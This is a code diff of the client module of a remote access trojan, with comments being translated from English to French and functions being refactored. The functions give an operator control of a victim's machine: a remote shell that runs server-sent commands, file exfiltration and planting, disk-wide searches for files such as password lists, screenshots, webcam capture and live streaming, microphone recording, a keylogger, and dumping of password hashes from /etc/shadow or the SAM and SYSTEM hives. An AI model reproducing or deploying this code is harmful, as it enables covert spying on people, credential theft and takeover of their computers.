@@ -1,19 +1,19 @@
 """
-Actions executed on the victim machine (client RAT).
+Actions exécutées sur la machine victime (client RAT).
 
-Each function corresponds to a command available in the RAT.
-This file is imported by client_app.py which routes commands
-received from the server to the appropriate function.
+Chaque fonction correspond à une commande disponible dans le RAT.
+Ce fichier est importé par client_app.py qui route les commandes
+reçues du serveur vers la bonne fonction.
 
-Compatibility: Windows and Linux.
+Compatibilité : Windows et Linux.
 """
 
 import base64
 import io
+import locale
 import platform
 import socket
 import subprocess
-import threading
 import wave
 from pathlib import Path
 
@@ -33,146 +33,309 @@ _keylogger_buffer: list[str] = []
 
 
 # ---------------------------------------------------------------------------
-# Helpers
+# Helpers internes
 # ---------------------------------------------------------------------------
 
 
 def _get_os() -> str:
-    """Return the operating system name ('Windows' or 'Linux')."""
+    """Retourne le nom du système d'exploitation ('Windows' ou 'Linux')."""
     return platform.system()
 
 
+def _run_command(command: str) -> str:
+    """
+    Exécute une commande shell et retourne la sortie sous forme de texte.
+    Gère automatiquement l'encodage selon l'OS (cp850 sur Windows).
+
+    Args:
+        command: Commande shell à exécuter.
+
+    Returns:
+        str: Sortie de la commande (stdout ou stderr).
+    """
+    os_name = _get_os()
+    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)
+
+    result = subprocess.run(
+        command,
+        shell=True,
+        capture_output=True,
+        text=True,
+        encoding=encoding,
+        errors="replace",
+        check=False,
+    )
+    return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"
+
+
 # ---------------------------------------------------------------------------
-# download — send a file from the victim to the server
+# ipconfig — configuration réseau
+# ---------------------------------------------------------------------------
+
+
+def get_ipconfig() -> str:
+    """
+    Retourne la configuration réseau de la machine.
+
+    - Windows : exécute 'ipconfig /all'
+    - Linux   : exécute 'ip addr'
+
+    Returns:
+        str: Sortie de la commande réseau.
+    """
+    os_name = _get_os()
+    command = "ipconfig /all" if os_name == "Windows" else "ip addr"
+    logger.info("ipconfig : commande '%s'", command)
+    return _run_command(command)
+
+
+# ---------------------------------------------------------------------------
+# sysinfo — informations système
+# ---------------------------------------------------------------------------
+
+
+def get_system_info() -> str:
+    """
+    Retourne les informations système.
+
+    - Windows : exécute 'systeminfo'
+    - Linux   : exécute 'uname -a'
+
+    Returns:
+        str: Sortie de la commande système.
+    """
+    os_name = _get_os()
+    command = "systeminfo" if os_name == "Windows" else "uname -a"
+    logger.info("sysinfo : commande '%s'", command)
+    return _run_command(command)
+
+
+# ---------------------------------------------------------------------------
+# screenshot — capture d'écran
+# ---------------------------------------------------------------------------
+
+
+def take_screenshot() -> str:
+    """
+    Prend une capture d'écran de la machine victime.
+
+    Utilise Pillow (PIL.ImageGrab) pour capturer l'écran entier,
+    puis encode le résultat en base64 pour le protocole JSON.
+
+    Returns:
+        str: Image JPEG encodée en base64, ou chaîne vide en cas d'erreur.
+    """
+    try:
+        from PIL import ImageGrab
+
+        img = ImageGrab.grab()
+        buffer = io.BytesIO()
+        img.save(buffer, format="JPEG")
+        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
+        logger.info("Screenshot pris (%d octets)", len(buffer.getvalue()))
+        return encoded
+
+    except Exception as exc:
+        logger.exception("Erreur lors du screenshot : %s", exc)
+        return ""
+
+
+# ---------------------------------------------------------------------------
+# shell — shell interactif
+# ---------------------------------------------------------------------------
+
+
+def handle_shell(conn: socket.socket) -> None:
+    """
+    Ouvre un shell interactif avec le serveur.
+
+    Attend des messages 'shell_input' depuis le serveur,
+    exécute chaque commande, et renvoie le résultat.
+    S'arrête quand le serveur envoie 'shell_stop'.
+
+    Args:
+        conn: Socket TLS connectée au serveur.
+    """
+    os_name = _get_os()
+    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)
+    logger.info("Shell interactif ouvert (OS: %s)", os_name)
+
+    while True:
+        try:
+            data = conn.recv(65536)
+            if not data:
+                break
+
+            message = decode_message(data.decode("utf-8").strip())
+
+            # Arrêt du shell demandé par le serveur
+            if message.get("command") == "shell_stop":
+                logger.info("Shell : arrêt demandé par le serveur")
+                break
+
+            # Exécution d'une commande shell
+            if message.get("type") == "shell_input":
+                cmd = message.get("input", "")
+                logger.info("Shell : exécution de '%s'", cmd)
+
+                result = subprocess.run(
+                    cmd,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    encoding=encoding,
+                    errors="replace",
+                    check=False,
+                )
+                output = result.stdout + result.stderr
+                conn.sendall(encode_message({"type": "shell_output", "output": output}))
+
+        except Exception as exc:
+            logger.exception("Erreur dans le shell interactif : %s", exc)
+            break
+
+
+# ---------------------------------------------------------------------------
+# download — envoi d'un fichier de la victime vers le serveur
 # ---------------------------------------------------------------------------
 
 
 def handle_download(remote_path: str) -> dict:
     """
-    Read a file on the victim machine and encode it in base64
-    to send it to the server.
+    Lit un fichier sur la machine victime et l'encode en base64
+    pour l'envoyer au serveur.
 
-    The server requested this file via the 'download <path>' command.
-    The content is base64-encoded because the protocol is JSON (text).
+    Le serveur a demandé ce fichier via la commande 'download <path>'.
+    Le contenu est encodé en base64 car le protocole est JSON (texte).
 
     Args:
-        remote_path: Absolute or relative path of the file on the victim.
+        remote_path: Chemin absolu ou relatif du fichier sur la victime.
 
     Returns:
-        dict: Response with the base64-encoded content, or an error.
+        dict: Réponse avec le contenu encodé en base64, ou une erreur.
     """
     path = Path(remote_path)
 
+    # Vérification que le fichier existe
     if not path.exists():
-        logger.warning("Download requested but file not found: %s", remote_path)
+        logger.warning("Download demandé mais fichier introuvable : %s", remote_path)
         return {
             "type": "command_result",
             "command": "download",
-            "error": f"File not found: {remote_path}",
+            "error": f"Fichier introuvable : {remote_path}",
         }
 
+    # Vérification que c'est bien un fichier (pas un dossier)
     if not path.is_file():
-        logger.warning("Download requested but path is not a file: %s", remote_path)
+        logger.warning("Download demandé mais le chemin n'est pas un fichier : %s", remote_path)
         return {
             "type": "command_result",
             "command": "download",
-            "error": f"Path is not a file: {remote_path}",
+            "error": f"Le chemin n'est pas un fichier : {remote_path}",
         }
 
     try:
+        # Lecture binaire + encodage base64 pour passer dans le JSON
         file_bytes = path.read_bytes()
         encoded = base64.b64encode(file_bytes).decode("utf-8")
-        logger.info("Download: %s (%s bytes)", remote_path, len(file_bytes))
+
+        logger.info("Download : %s (%s octets)", remote_path, len(file_bytes))
+
         return {
             "type": "command_result",
             "command": "download",
             "filename": path.name,
             "data": encoded,
-            "output": f"File sent: {path.name} ({len(file_bytes)} bytes)",
+            "output": f"Fichier envoyé : {path.name} ({len(file_bytes)} octets)",
         }
 
     except PermissionError:
-        logger.warning("Download denied (permissions): %s", remote_path)
+        logger.warning("Download refusé (permissions) : %s", remote_path)
         return {
             "type": "command_result",
             "command": "download",
-            "error": f"Permission denied: {remote_path}",
+            "error": f"Permission refusée : {remote_path}",
         }
 
     except Exception as exc:
-        logger.exception("Error during download of %s: %s", remote_path, exc)
+        logger.exception("Erreur lors du download de %s : %s", remote_path, exc)
         return {
             "type": "command_result",
             "command": "download",
-            "error": f"Error: {exc}",
+            "error": f"Erreur : {exc}",
         }
 
 
 # ---------------------------------------------------------------------------
-# upload — receive a file sent by the server and write it on the victim
+# upload — réception d'un fichier envoyé par le serveur
 # ---------------------------------------------------------------------------
 
 
 def handle_upload(message: dict) -> dict:
     """
-    Receive a file sent by the server and write it on the victim.
+    Reçoit un fichier envoyé par le serveur et l'écrit sur la victime.
 
-    The server encoded the file in base64 in the message.
-    We decode it and write it to the current directory of the agent.
+    Le serveur a encodé le fichier en base64 dans le message.
+    On le décode et on l'écrit dans le répertoire courant de l'agent.
 
     Args:
-        message: Server message containing 'filename' and 'data' (base64).
+        message: Message du serveur contenant 'filename' et 'data' (base64).
 
     Returns:
-        dict: Write confirmation or error message.
+        dict: Confirmation d'écriture ou message d'erreur.
     """
     filename = message.get("filename", "uploaded_file")
     encoded_data = message.get("data", "")
 
     if not encoded_data:
-        logger.warning("Upload received but no data in message")
+        logger.warning("Upload reçu mais aucune donnée dans le message")
         return {
             "type": "command_result",
             "command": "upload",
-            "error": "No data received.",
+            "error": "Aucune donnée reçue.",
         }
 
     try:
+        # Décodage base64 → bytes → écriture sur disque
         file_bytes = base64.b64decode(encoded_data)
         save_path = Path(filename)
         save_path.write_bytes(file_bytes)
-        logger.info("Upload received and saved: %s (%s bytes)", save_path, len(file_bytes))
+
+        logger.info("Upload reçu et sauvegardé : %s (%s octets)", save_path, len(file_bytes))
+
         return {
             "type": "command_result",
             "command": "upload",
-            "output": f"File received and saved: {save_path} ({len(file_bytes)} bytes)",
+            "output": f"Fichier reçu et sauvegardé : {save_path} ({len(file_bytes)} octets)",
         }
 
     except Exception as exc:
-        logger.exception("Error during upload of %s: %s", filename, exc)
+        logger.exception("Erreur lors de l'upload de %s : %s", filename, exc)
         return {
             "type": "command_result",
             "command": "upload",
-            "error": f"Error: {exc}",
+            "error": f"Erreur : {exc}",
         }
 
 
 # ---------------------------------------------------------------------------
-# search — search for a file on the victim machine
+# search — rechercher un fichier sur la machine victime
 # ---------------------------------------------------------------------------
 
 
 def search_file(filename: str) -> str:
     """
-    Search for a file by name on the entire victim machine.
+    Recherche un fichier par nom sur toute la machine victime.
 
     Args:
-        filename: Name of the file to search for (e.g. "passwords.txt").
+        filename: Nom du fichier à chercher (ex: "passwords.txt").
 
     Returns:
-        str: List of found paths, or a message if no results.
+        str: Liste des chemins trouvés, ou message si aucun résultat.
     """
     results = []
+
+    # Recherche récursive depuis la racine
     root = Path("C:/") if _get_os() == "Windows" else Path("/")
 
     for path in root.rglob(filename):
@@ -182,274 +345,93 @@ def search_file(filename: str) -> str:
             continue
 
     if not results:
-        return f"No file found for: {filename}"
+        return f"Aucun fichier trouvé pour : {filename}"
 
     return "\n".join(results)
 
 
 # ---------------------------------------------------------------------------
-# get_system_info — return system information
+# record_audio — enregistrement micro
 # ---------------------------------------------------------------------------
 
-
-def get_system_info() -> str:
-    """
-    Return detailed system information of the victim.
-
-    Uses 'systeminfo' on Windows and 'uname -a' on Linux.
-
-    Returns:
-        str: Output of the system command.
-    """
-    import locale
-
-    system_name = _get_os()
-    command = "systeminfo" if system_name == "Windows" else "uname -a"
-    encoding = "cp850" if system_name == "Windows" else locale.getpreferredencoding(False)
-
-    result = subprocess.run(
-        command,
-        shell=True,
-        capture_output=True,
-        text=True,
-        encoding=encoding,
-        errors="replace",
-        check=False,
-    )
-    return result.stdout.strip() or result.stderr.strip() or "No output"
-
-
-# ---------------------------------------------------------------------------
-# get_ipconfig — retrieve network configuration of the victim machine
-# ---------------------------------------------------------------------------
-
-
-def get_ipconfig() -> str:
-    """
-    Return the network configuration of the victim machine.
-
-    Uses 'ipconfig /all' on Windows and 'ip a' on Linux.
-
-    Returns:
-        str: Output of the network command.
-    """
-    command = "ipconfig /all" if _get_os() == "Windows" else "ip a"
-    encoding = "cp850" if _get_os() == "Windows" else "utf-8"
-
-    result = subprocess.run(
-        command,
-        shell=True,
-        capture_output=True,
-        text=True,
-        encoding=encoding,
-        errors="replace",
-        check=False,
-    )
-    return result.stdout.strip() or result.stderr.strip() or "No output"
-
-
-# ---------------------------------------------------------------------------
-# take_screenshot — capture a screenshot of the victim's screen
-# ---------------------------------------------------------------------------
-
-
-def take_screenshot() -> str:
-    """
-    Take a screenshot of the victim's screen.
-
-    Uses mss (cross-platform) to capture the primary monitor,
-    encodes the result as base64 PNG for JSON transport.
-
-    Returns:
-        str: Base64-encoded PNG image, or empty string on failure.
-    """
-    try:
-        import mss
-        import mss.tools
-
-        with mss.mss() as sct:
-            monitor = sct.monitors[1]  # primary monitor
-            screenshot = sct.grab(monitor)
-            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
-            encoded = base64.b64encode(png_bytes).decode("utf-8")
-            logger.info("Screenshot captured (%d bytes)", len(png_bytes))
-            return encoded
-
-    except Exception as exc:
-        logger.exception("Screenshot error: %s", exc)
-        return ""
-
-
-# ---------------------------------------------------------------------------
-# handle_shell — open an interactive shell on the victim machine
-# ---------------------------------------------------------------------------
-
-
-def handle_shell(conn: object) -> None:
-    """
-    Open an interactive shell on the victim machine.
-
-    Starts a cmd (Windows) or bash (Linux) process and relays
-    commands/output between the server and the shell process.
-
-    Args:
-        conn: TLS socket connected to the server.
-    """
-    shell_cmd = "cmd.exe" if _get_os() == "Windows" else "/bin/bash"
-    encoding = "cp850" if _get_os() == "Windows" else "utf-8"
-
-    logger.info("Opening shell: %s", shell_cmd)
-
-    process = subprocess.Popen(
-        shell_cmd,
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
-        encoding=encoding,
-        errors="replace",
-    )
-
-    try:
-        while True:
-            data = conn.recv(65536)
-            if not data:
-                logger.info("Connection closed during shell")
-                break
-
-            message = decode_message(data.decode("utf-8").strip())
-            msg_type = message.get("type")
-            command = message.get("command", "")
-
-            if msg_type == "command" and command == "shell_stop":
-                logger.info("Shell closed on server request")
-                break
-
-            if msg_type == "shell_input":
-                cmd_input = message.get("input", "")
-                logger.info("Shell input: %s", cmd_input)
-
-                try:
-                    process.stdin.write(cmd_input + "\n")
-                    process.stdin.flush()
-
-                    result_lines: list[str] = []
-
-                    def _read_output() -> None:
-                        try:
-                            for line in process.stdout:
-                                result_lines.append(line)
-                                if not line.strip():
-                                    break
-                        except Exception:
-                            pass
-
-                    reader = threading.Thread(target=_read_output, daemon=True)
-                    reader.start()
-                    reader.join(timeout=3)
-
-                    conn.sendall(encode_message({
-                        "type": "shell_output",
-                        "command": "shell",
-                        "output": "".join(result_lines),
-                    }))
-
-                except Exception as exc:
-                    logger.exception("Shell error for command: %s", cmd_input)
-                    conn.sendall(encode_message({
-                        "type": "shell_output",
-                        "command": "shell",
-                        "output": f"Error: {exc}",
-                    }))
-
-    finally:
-        try:
-            process.terminate()
-            process.wait(timeout=2)
-        except Exception:
-            process.kill()
-        logger.info("Shell process terminated")
-
-
-# ---------------------------------------------------------------------------
-# record_audio — record microphone audio and return it as a base64 WAV string
-# ---------------------------------------------------------------------------
-
-AUDIO_SAMPLE_RATE = 44100  # Hz (CD quality)
+AUDIO_SAMPLE_RATE = 44100  # Hz (qualité CD)
 AUDIO_CHANNELS = 1  # mono
 
 
 def record_audio(duration: int = 5) -> str:
     """
-    Record audio from the client microphone and return it as a base64 WAV string.
+    Enregistre l'audio depuis le micro de la victime et retourne un WAV en base64.
 
-    Uses sounddevice to capture PCM int16 audio, then wraps it in a WAV
-    container (stdlib wave module) and encodes it in base64 for JSON transport.
+    Utilise sounddevice pour capturer le PCM int16, puis emballe dans un
+    conteneur WAV (module wave stdlib) et encode en base64 pour le JSON.
 
     Args:
-        duration: Recording duration in seconds (default: 5).
+        duration: Durée d'enregistrement en secondes (défaut : 5).
 
     Returns:
-        str: Base64-encoded WAV audio data.
+        str: Données audio WAV encodées en base64.
     """
-    logger.info("Recording audio for %s second(s)...", duration)
+    logger.info("Enregistrement audio pendant %s seconde(s)...", duration)
 
+    # 1. Capture depuis le micro par défaut en PCM 16 bits
     frames = sounddevice.rec(
         int(duration * AUDIO_SAMPLE_RATE),
         samplerate=AUDIO_SAMPLE_RATE,
         channels=AUDIO_CHANNELS,
         dtype="int16",
     )
-    sounddevice.wait()
+    sounddevice.wait()  # bloque jusqu'à la fin de l'enregistrement
 
-    logger.info("Recording finished (%s frames captured)", len(frames))
+    logger.info("Enregistrement terminé (%s frames capturées)", len(frames))
 
+    # 2. Écriture en mémoire dans un conteneur WAV (pas de fichier temporaire)
     wav_buffer = io.BytesIO()
     with wave.open(wav_buffer, "wb") as wav_file:
         wav_file.setnchannels(AUDIO_CHANNELS)
-        wav_file.setsampwidth(2)  # 2 bytes = 16 bits per sample
+        wav_file.setsampwidth(2)  # 2 octets = 16 bits par sample
         wav_file.setframerate(AUDIO_SAMPLE_RATE)
         wav_file.writeframes(frames.tobytes())
 
+    # 3. Encodage base64 pour transport JSON
     return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")
 
 
 # ---------------------------------------------------------------------------
-# webcam_snapshot — capture a photo from the victim's webcam
+# webcam_snapshot — capture d'une photo webcam
 # ---------------------------------------------------------------------------
 
 
 def webcam_snapshot() -> str:
     """
-    Capture one frame from the victim's webcam.
+    Capture une photo depuis la webcam de la victime.
 
-    Opens the default camera (index 0), reads one frame,
-    encodes it as JPEG, then returns it as a base64 string
-    so it can be sent over the JSON protocol.
+    Ouvre la caméra par défaut (index 0), lit une frame,
+    l'encode en JPEG, puis retourne le résultat en base64
+    pour le protocole JSON.
 
     Returns:
-        str: Base64-encoded JPEG image, or empty string on failure.
+        str: Image JPEG encodée en base64, ou chaîne vide en cas d'erreur.
     """
     import cv2
 
     cam = cv2.VideoCapture(0)
     if not cam.isOpened():
-        logger.warning("webcam_snapshot: no webcam available (index 0)")
+        logger.warning("webcam_snapshot: pas de webcam disponible (index 0)")
         return ""
 
     try:
         success, frame = cam.read()
         if not success:
-            logger.warning("webcam_snapshot: failed to read frame")
+            logger.warning("webcam_snapshot: impossible de lire la frame")
             return ""
 
         _, buffer = cv2.imencode(".jpg", frame)
         encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
-        logger.info("webcam_snapshot: frame captured (%d bytes)", len(buffer))
+        logger.info("webcam_snapshot: frame capturée (%d octets)", len(buffer))
         return encoded
 
     except Exception as exc:
-        logger.exception("webcam_snapshot error: %s", exc)
+        logger.exception("webcam_snapshot erreur : %s", exc)
         return ""
 
     finally:
@@ -457,42 +439,43 @@ def webcam_snapshot() -> str:
 
 
 # ---------------------------------------------------------------------------
-# webcam_stream — stream live video from the victim's webcam
+# webcam_stream — diffusion vidéo en direct
 # ---------------------------------------------------------------------------
 
 
 def webcam_stream(conn: socket.socket) -> None:
     """
-    Stream live webcam frames to the server until a stop signal is received.
+    Diffuse le flux webcam en direct vers le serveur.
 
-    Each frame is sent as {"type": "stream_frame", "data": "<base64 JPEG>"}.
-    The loop stops when the server sends {"type": "stream_stop"} or on error.
+    Chaque frame est envoyée sous la forme {"type": "stream_frame", "data": "<base64 JPEG>"}.
+    La boucle s'arrête quand le serveur envoie {"type": "stream_stop"} ou en cas d'erreur.
 
     Args:
-        conn: TLS socket connected to the server.
+        conn: Socket TLS connectée au serveur.
     """
     import cv2
 
     cam = cv2.VideoCapture(0)
     if not cam.isOpened():
-        logger.warning("webcam_stream: no webcam available (index 0)")
+        logger.warning("webcam_stream: pas de webcam disponible (index 0)")
         conn.sendall(encode_message({"type": "stream_error", "error": "No webcam available"}))
         return
 
-    conn.settimeout(0.05)
+    conn.settimeout(0.05)  # timeout court pour vérifier le signal stop entre les frames
 
     try:
         while True:
             success, frame = cam.read()
             if not success:
-                logger.warning("webcam_stream: failed to read frame")
+                logger.warning("webcam_stream: impossible de lire la frame")
                 break
 
+            # Encodage JPEG puis base64 (même logique que webcam_snapshot)
             _, buffer = cv2.imencode(".jpg", frame)
             encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
             conn.sendall(encode_message({"type": "stream_frame", "data": encoded}))
 
-            # Check for stop signal (non-blocking)
+            # Vérification non-bloquante d'un signal stop
             try:
                 raw = conn.recv(4096)
                 if raw:
@@ -500,38 +483,39 @@ def webcam_stream(conn: socket.socket) -> None:
                     if msg.get("type") == "stream_stop":
                         break
             except TimeoutError:
-                pass
+                pass  # pas de signal stop, on continue
 
     except Exception as exc:
-        logger.exception("webcam_stream error: %s", exc)
+        logger.exception("webcam_stream erreur : %s", exc)
 
     finally:
         cam.release()
-        conn.settimeout(None)
-        logger.info("webcam_stream: stopped")
+        conn.settimeout(None)  # rétablir le mode bloquant
+        logger.info("webcam_stream: arrêté")
 
 
 # ---------------------------------------------------------------------------
-# toggle_keylogger — record victim's keystrokes
+# keylogger — enregistrement des frappes clavier
 # ---------------------------------------------------------------------------
 
 
 def toggle_keylogger() -> str:
     """
-    Start or stop the keylogger.
+    Démarre ou arrête le keylogger.
 
-    - First call  : starts a background listener, returns a confirmation.
-    - Second call : stops the listener, returns all captured keystrokes.
+    - Premier appel  : démarre un listener en arrière-plan, retourne une confirmation.
+    - Deuxième appel : arrête le listener, retourne toutes les touches capturées.
 
-    Uses pynput.keyboard.Listener which runs in a separate thread.
+    Utilise pynput.keyboard.Listener qui tourne dans un thread séparé.
 
     Returns:
-        str: Status message, or captured keystrokes on stop.
+        str: Message de statut, ou les touches capturées à l'arrêt.
     """
     from pynput import keyboard
 
     global _keylogger_listener, _keylogger_buffer
 
+    # --- Arrêt ---
     if _keylogger_listener is not None:
         _keylogger_listener.stop()
         _keylogger_listener = None
@@ -540,10 +524,12 @@ def toggle_keylogger() -> str:
         logger.info("Keylogger stopped. %d chars captured.", len(captured))
         return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"
 
+    # --- Démarrage ---
     def on_press(key: keyboard.Key) -> None:
         try:
             _keylogger_buffer.append(key.char)
         except AttributeError:
+            # Touches spéciales (Entrée, Maj, etc.)
             _keylogger_buffer.append(f"[{key.name}]")
 
     _keylogger_listener = keyboard.Listener(on_press=on_press)
@@ -553,20 +539,20 @@ def toggle_keylogger() -> str:
 
 
 # ---------------------------------------------------------------------------
-# hashdump — retrieve password hashes
+# hashdump — récupération des hashes de mots de passe
 # ---------------------------------------------------------------------------
 
 
 def hashdump() -> str:
     """
-    Retrieve password hashes depending on the OS.
+    Récupère les hashes de mots de passe selon l'OS.
 
-    - Linux   : reads /etc/shadow (requires root privileges)
-    - Windows : saves SAM and SYSTEM hives via reg.exe
-                (requires Administrator privileges)
+    - Linux   : lit /etc/shadow (nécessite les droits root)
+    - Windows : sauvegarde les ruches SAM et SYSTEM via reg.exe
+                (nécessite les droits Administrateur)
 
     Returns:
-        str: Shadow file content, saved hive paths, or an error message.
+        str: Contenu du fichier shadow, chemins des ruches, ou message d'erreur.
     """
     import tempfile
 
@@ -576,10 +562,10 @@ def hashdump() -> str:
         shadow_path = Path("/etc/shadow")
         try:
             content = shadow_path.read_text(encoding="utf-8")
-            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
+            logger.info("hashdump Linux: %d lignes récupérées", content.count("\n"))
             return content
         except PermissionError:
-            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
+            logger.warning("hashdump: permission refusée pour %s (root requis)", shadow_path)
             return f"Error: permission denied to read {shadow_path} (root required)"
         except FileNotFoundError:
             return f"Error: {shadow_path} not found"
@@ -593,6 +579,7 @@ def hashdump() -> str:
                 sam_path = str(Path(tmpdir) / "SAM")
                 system_path = str(Path(tmpdir) / "SYSTEM")
 
+                # Sauvegarde des ruches
                 for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
                     result = subprocess.run(
                         ["reg", "save", hive, dest, "/y"],
@@ -601,10 +588,10 @@ def hashdump() -> str:
                         check=False,
                     )
                     if result.returncode != 0:
-                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
+                        logger.warning("hashdump Windows erreur sur %s: %s", hive, result.stderr.strip())
                         return f"Error saving {hive}: {result.stderr.strip()}"
 
-                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
+                logger.info("hashdump Windows: ruches SAM et SYSTEM sauvegardées")
                 return (
                     f"Hives saved:\n"
                     f"  SAM    -> {sam_path}\n"
